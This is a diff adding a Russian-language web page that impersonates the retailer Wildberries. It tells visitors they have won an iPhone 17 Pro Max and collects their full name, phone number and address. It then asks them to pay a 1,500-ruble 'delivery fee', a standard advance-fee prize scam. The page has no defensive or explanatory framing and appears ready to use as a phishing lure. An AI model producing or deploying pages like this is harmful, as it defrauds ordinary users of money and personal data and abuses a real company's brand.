@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Поздравляем! Вы выиграли iPhone 17 Pro Max</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="animated-bg">
+        <div class="gradient-orb orb-1"></div>
+        <div class="gradient-orb orb-2"></div>
+        <div class="gradient-orb orb-3"></div>
+    </div>
+
+    <div class="confetti-container">
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+    </div>
+    
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                    <rect width="32" height="32" rx="8" fill="url(#logoGradient)"/>
+                    <path d="M8 12L16 8L24 12V20L16 24L8 20V12Z" stroke="white" stroke-width="2" fill="none"/>
+                    <defs>
+                        <linearGradient id="logoGradient" x1="0" y1="0" x2="32" y2="32">
+                            <stop offset="0%" stop-color="#FF6B6B"/>
+                            <stop offset="100%" stop-color="#EE5A6F"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+            <span class="logo-text">Wildberries</span>
+        </div>
+
+        <div class="main-content">
+            <div class="trophy-icon">
+                <svg width="80" height="80" viewBox="0 0 100 100" fill="none">
+                    <path d="M50 10L60 30H80L65 45L70 65L50 55L30 65L35 45L20 30H40L50 10Z" fill="url(#trophyGradient)"/>
+                    <defs>
+                        <linearGradient id="trophyGradient" x1="50" y1="10" x2="50" y2="65">
+                            <stop offset="0%" stop-color="#FFD700"/>
+                            <stop offset="100%" stop-color="#FFA500"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+            
+            <h1 class="congratulations">
+                <span class="gradient-text">Поздравляем!</span>
+            </h1>
+            
+            <div class="prize-box glass-effect">
+                <div class="prize-badge">ПРИЗ</div>
+                <div class="iphone-container">
+                    <div class="iphone-glow"></div>
+                    <div class="iphone-image">📱</div>
+                </div>
+                <h2 class="prize-title">iPhone 17 Pro Max</h2>
+                <p class="prize-subtitle">от Wildberries</p>
+                <div class="prize-tag">256 GB • Титан</div>
+            </div>
+
+            <div class="info-box glass-effect">
+                <div class="info-icon">ℹ️</div>
+                <p class="info-text">
+                    Ваш приз готов к отправке! Для получения iPhone 17 Pro Max необходимо оплатить доставку.
+                </p>
+            </div>
+
+            <form class="delivery-form" id="deliveryForm">
+                <div class="form-group">
+                    <label for="name">
+                        <span>ФИО получателя</span>
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="text" id="name" name="name" required placeholder="Иванов Иван Иванович" autocomplete="name">
+                        <span class="input-icon">👤</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">
+                        <span>Номер телефона</span>
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="tel" id="phone" name="phone" required placeholder="+7 (999) 123-45-67" autocomplete="tel">
+                        <span class="input-icon">📞</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="address">
+                        <span>Адрес доставки</span>
+                    </label>
+                    <div class="input-wrapper">
+                        <textarea id="address" name="address" required placeholder="Город, улица, дом, квартира" autocomplete="street-address"></textarea>
+                        <span class="input-icon">📍</span>
+                    </div>
+                </div>
+
+                <div class="delivery-cost glass-effect">
+                    <div class="cost-item">
+                        <div class="cost-label">
+                            <span class="cost-icon">🚚</span>
+                            <span>Стоимость доставки</span>
+                        </div>
+                        <span class="cost-value">1 500 ₽</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    <span class="btn-text">Оплатить доставку</span>
+                    <span class="btn-arrow">
+                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                            <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </span>
+                </button>
+
+                <p class="form-note">
+                    <span class="note-icon">⏱️</span>
+                    После оплаты доставки ваш приз будет отправлен в течение 24 часов
+                </p>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Wildberries. Все права защищены.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
